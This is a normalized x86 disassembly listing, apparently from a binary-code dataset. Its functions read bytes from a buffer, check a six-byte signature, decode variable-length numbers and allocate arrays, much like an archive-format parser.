shl edx 0x5
mov eax [ ebp + 0x8 ]
add edx [ eax + 0x10 ]
mov [ ebp - 0x2c ] edx
mov ecx [ ebp - 0x2c ]
movzx edx [ ecx + 0x18 ]
test edx edx
jne r-xdata
mov [ ebp - 0x24 ] 0x0
mov [ ebp - 0x24 ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x3c ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + ecx * 4 ] edx
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
cmp edx [ ecx + 0x18 ]
jb r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov [ edx + eax * 4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
mov edx [ ebp - 0xc ]
cmp edx [ eax + ecx + 0x24 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x38 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ecx + edx * 4 ] eax
mov ecx [ ebp - 0x8 ]
imul ecx ecx 0x28
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0xc ]
cmp [ eax + ecx + 0x24 ] 0x0
je r-xdata
mov eax 0x10
jmp r-xdata
mov edx [ ebp - 0x4 ]
add edx 0x1
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] 0x0
mov ecx [ ebp - 0x8 ]
add ecx 0x1
mov [ ebp - 0x8 ] ecx
jmp r-xdata
jmp r-xdata
sub_402e70
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x30 ]
mov edx [ ebp + 0xc ]
mov eax [ ecx + edx * 4 ]
add eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x34 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx + 0x28 ]
add esi [ edx + eax * 8 ]
mov ecx [ ecx + 0x2c ]
adc ecx [ edx + eax * 8 + 0x4 ]
mov eax esi
mov edx ecx
pop esi
pop ebp
retn
sub_402ea0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] 0x6
jae r-xdata
mov eax 0x1
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x4 ]
movzx edx [ ecx ]
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + rw-data ]
cmp edx ecx
je r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_402ef0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
sub edx 0x1
mov eax [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
mov eax [ ebp + 0xc ]
mov cl [ edx ]
mov [ eax ] cl
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
add eax 0x1
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
xor eax eax
mov eax 0x10
jmp r-xdata
pop ebp
retn
sub_402f30
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jae r-xdata
xor eax eax
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x4 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_402ef0
add esp 0x8
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov esp ebp
pop ebp
retn
sub_402f80
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ eax ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ ebp - 0xc ] 0x4
jge r-xdata
xor eax eax
lea edx [ ebp - 0x5 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_402ef0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx edx [ ebp - 0x5 ]
mov ecx [ ebp - 0xc ]
shl ecx 0x3
shl edx cl
mov eax [ ebp + 0xc ]
or edx [ eax ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] edx
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_403000
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x7 ] 0x80
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402ef0
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp + 0xc ]
mov [ edx ] 0x0
mov [ edx + 0x4 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x8
jge r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
xor eax eax
movzx ecx [ ebp - 0x5 ]
movzx edx [ ebp - 0x7 ]
and ecx edx
jne r-xdata
lea edx [ ebp - 0x6 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_402ef0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx eax [ ebp - 0x5 ]
movzx ecx [ ebp - 0x7 ]
sub ecx 0x1
and eax ecx
cdq
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0xc ]
shl ecx 0x3
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
call sub_41bd70
mov ecx [ ebp + 0xc ]
add eax [ ecx ]
adc edx [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
xor eax eax
jmp r-xdata
movzx eax [ ebp - 0x6 ]
cdq
mov ecx [ ebp - 0xc ]
shl ecx 0x3
call sub_41bd70
mov ecx [ ebp + 0xc ]
or eax [ ecx ]
or edx [ ecx + 0x4 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov dl [ ebp - 0x7 ]
shr dl 0x1
mov [ ebp - 0x7 ] dl
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_403110
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403000
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax 0x4
jmp r-xdata
cmp [ ebp - 0xc ] 0x80000000
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
mov eax 0x4
jmp r-xdata
cmp [ ebp - 0xc ] 0x4000000
jb r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp + 0xc ]
mov [ eax ] edx
xor eax eax
sub_4031b0
push ebp
mov ebp esp
sub esp 0x8
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
xor edx edx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x4 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x4 ]
sub eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
add edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] edx
xor eax eax
ja r-xdata
mov eax 0x10
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x8 ]
jbe r-xdata
mov esp ebp
pop ebp
retn
sub_403200
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403000
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
push edx
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4031b0
add esp 0xc
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
sub_403250
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
or edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_403200
add esp 0x4
jmp r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
sub_4032b0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x10 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_403200
add esp 0x4
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax 0x10
jmp r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403190
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
sub_403330
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x6 ] 0x0
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x14 ]
push edx
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x10 ]
mov [ edx ] eax
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
cmp edx [ ebp + 0xc ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
xor eax eax
movzx eax [ ebp - 0x6 ]
test eax eax
jne r-xdata
movzx eax [ ebp - 0x5 ]
movzx ecx [ ebp - 0x6 ]
and eax ecx
je r-xdata
lea ecx [ ebp - 0x5 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402ef0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0x1
jmp r-xdata
mov [ ebp - 0x6 ] 0x80
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
add ecx 0x1
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov dl [ ebp - 0x14 ]
mov [ eax + ecx ] dl
mov al [ ebp - 0x6 ]
shr al 0x1
mov [ ebp - 0x6 ] al
jmp r-xdata
sub_403410
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402ef0
add esp 0x8
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
movzx edx [ ebp - 0x5 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403330
add esp 0x10
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x14 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov edx [ ebp + 0x10 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov [ eax + ecx ] 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
sub_4034e0
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x10 ]
push ecx
mov edx [ ebp + 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403410
add esp 0x10
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov edx [ ebp + 0xc ]
shl edx 0x2
push edx
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x18 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
mov ecx [ ebp + 0x14 ]
mov [ ecx ] 0x0
jmp r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0xc ]
jae r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
movzx edx [ eax + ecx ]
test edx edx
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
lea eax [ ecx + edx * 4 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402f80
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
jmp r-xdata
sub_4035b0
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403000
add esp 0x8
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403110
add esp 0x8
mov [ ebp - 0x2c ] eax
cmp [ ebp - 0x2c ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
jmp r-xdata
push 0x0
push 0x9
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4032b0
add esp 0xc
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x10 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ ebp - 0x28 ]
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
shl edx 0x3
push edx
mov eax [ ebp + 0x20 ]
push eax
mov ecx [ ebp + 0x20 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov edx [ ebp + 0x14 ]
cmp [ edx ] 0x0
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ eax ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov edx [ ebp - 0x10 ]
cmp edx [ ecx ]
jae r-xdata
lea edx [ ebp - 0xc ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403190
add esp 0x8
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
mov ecx [ eax ]
mov edx [ ebp - 0x10 ]
lea eax [ ecx + edx * 8 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403000
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
or ecx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0xa
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov edx [ ebp + 0x8 ]
push edx
call sub_403200
add esp 0x4
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x24 ]
jmp r-xdata
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x18 ]
push ecx
mov edx [ ebp + 0x10 ]
mov eax [ edx ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_4034e0
add esp 0x14
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
push ecx
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x18 ]
mov [ edx ] eax
mov eax [ ebp + 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp + 0x18 ]
mov [ edx ] 0x0
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp [ ecx ] 0x0
jne r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ eax ]
shl ecx 0x2
push ecx
mov edx [ ebp + 0x20 ]
push edx
mov eax [ ebp + 0x20 ]
mov ecx [ eax ]
call ecx
add esp 0x8
mov edx [ ebp + 0x1c ]
mov [ edx ] eax
mov eax [ ebp + 0x1c ]
cmp [ eax ] 0x0
jne r-xdata
mov edx [ ebp + 0x1c ]
mov [ edx ] 0x0
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ ebp - 0x10 ]
cmp eax [ edx ]
jae r-xdata
mov ecx [ ebp + 0x18 ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
mov [ edx + eax ] 0x0
mov ecx [ ebp + 0x1c ]
mov edx [ ecx ]
mov eax [ ebp - 0x10 ]
mov [ edx + eax * 4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
sub_403810
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x5 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402ef0
add esp 0x8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx edx [ ebp - 0x5 ]
test edx edx
jne r-xdata
mov eax [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x4
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
sub_403870
push ebp
mov ebp esp
sub esp 0xa0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x0
mov [ ebp - 0x4c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403110
add esp 0x8
mov [ ebp - 0x9c ] eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp - 0x1c ] 0x20
jbe r-xdata
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x1c ]
mov [ edx + 0x10 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40f682
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x1c ]
imul edx edx 0x18
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x88 ]
mov [ eax ] ecx
cmp [ ebp - 0x88 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x34 ]
imul ecx ecx 0x18
mov edx [ ebp + 0xc ]
add ecx [ edx ]
push ecx
call sub_402650
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x34 ]
cmp ecx [ ebp - 0x1c ]
jae r-xdata
mov edx [ ebp - 0x34 ]
add edx 0x1
mov [ ebp - 0x34 ] edx
cmp [ ebp - 0x4c ] 0x0
jne r-xdata
mov edx [ ebp - 0x34 ]
imul edx edx 0x18
mov eax [ ebp + 0xc ]
add edx [ eax ]
mov [ ebp - 0x38 ] edx
lea ecx [ ebp - 0x15 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_402ef0
add esp 0x8
mov [ ebp - 0x90 ] eax
cmp [ ebp - 0x90 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4c ]
sub ecx 0x1
mov [ ebp - 0x3c ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ edx + 0x14 ] eax
cmp [ ebp - 0x3c ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
movzx eax [ ebp - 0x15 ]
and eax 0xf
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x50 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_402f30
add esp 0xc
mov [ ebp - 0x98 ] eax
cmp [ ebp - 0x98 ] 0x0
je r-xdata
mov eax [ ebp - 0x90 ]
jmp r-xdata
mov edx [ ebp - 0x3c ]
shl edx 0x3
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x58 ]
mov [ eax + 0x4 ] ecx
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] 0x0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x8
jbe r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
mov [ ebp - 0x34 ] 0x0
jmp r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] 0x0
mov [ ecx + 0xc ] 0x0
mov [ ebp - 0x44 ] 0x0
jmp r-xdata
mov eax 0x4
jmp r-xdata
mov eax [ ebp - 0x34 ]
cmp eax [ ebp - 0x3c ]
jae r-xdata
mov eax [ ebp - 0x44 ]
cmp eax [ ebp - 0x50 ]
jae r-xdata
mov eax [ ebp - 0x40 ]
cmp eax [ ebp - 0x3c ]
jae r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x34 ]
lea ecx [ edx + eax * 8 ]
mov [ ebp - 0x68 ] ecx
mov edx [ ebp - 0x68 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_403110
add esp 0x8
mov [ ebp - 0x60 ] eax
cmp [ ebp - 0x60 ] 0x0
je r-xdata
movzx edx [ ebp - 0x15 ]
and edx 0x10
je r-xdata
mov ecx [ ebp - 0x50 ]
sub ecx 0x1
sub ecx [ ebp - 0x44 ]
movzx eax [ ebp + ecx - 0x14 ]
cdq
mov ecx [ ebp - 0x44 ]
shl ecx 0x3
call sub_41bd70
mov ecx [ ebp - 0x38 ]
or eax [ ecx + 0x8 ]
or edx [ ecx + 0xc ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] edx
jmp r-xdata
mov ecx [ ebp - 0x40 ]
sub ecx [ ebp - 0x3c ]
mov [ ebp - 0x48 ] ecx
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x48 ]
mov [ edx + 0x18 ] eax
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
mov eax 0x4
jmp r-xdata
mov ecx [ ebp - 0x68 ]
add ecx 0x4
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_403110
add esp 0x8
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x60 ]
jmp r-xdata
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x1
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x4 ] 0x1
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call sub_403110
add esp 0x8
mov [ ebp - 0xa0 ] eax
cmp [ ebp - 0xa0 ] 0x0
je r-xdata
mov edx [ ebp - 0x44 ]
add edx 0x1
mov [ ebp - 0x44 ] edx
mov edx [ ebp - 0x48 ]
shl edx 0x2
push edx
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0x10 ]
mov edx [ ecx ]
call edx
add esp 0x8
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x78 ]
mov [ eax + 0x8 ] ecx
cmp [ ebp - 0x78 ] 0x0
jne r-xdata
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x8 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x70 ]
jmp r-xdata
